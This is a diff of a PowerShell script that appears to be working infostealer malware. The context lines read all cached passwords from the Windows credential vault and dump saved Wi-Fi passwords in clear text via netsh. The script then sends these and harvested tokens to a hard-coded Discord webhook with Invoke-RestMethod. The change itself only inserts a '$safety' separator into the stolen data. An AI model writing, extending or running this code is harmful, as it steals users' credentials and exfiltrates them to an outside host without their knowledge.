@@ -5,10 +5,10 @@ $vault = New-Object Windows.Security.Credentials.PasswordVault
 $cachedPasswords = $vault.RetrieveAll() | % { $_.RetrievePassword();$_ } | Format-Table -HideTableHeaders | Out-String
 
 $wifiData = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String 
-
+$safety = "O_O"
 $Body = @{
   'username' = 'Tokens: '
-  'content' = $wifiData + $cachedPasswords
+  'content' = $wifiData + $safety + $cachedPasswords + $safety
 }
 Invoke-RestMethod -Uri $hookUrl -Method 'post' -Body $Body
 
@@ -206,6 +206,6 @@ $hookUrl = 'https://discord.com/api/webhooks/889662758910574662/aHaHRR3GFmiFr-wD
 
 $Body = @{
   'username' = 'Tokens: '
-  'content' = $possibleTokens | Format-Table -HideTableHeaders | Out-String
+  'content' = $possibleTokens | Format-Table -HideTableHeaders | Out-String + $safety
 }
 Invoke-RestMethod -Uri $hookUrl -Method 'post' -Body $Body
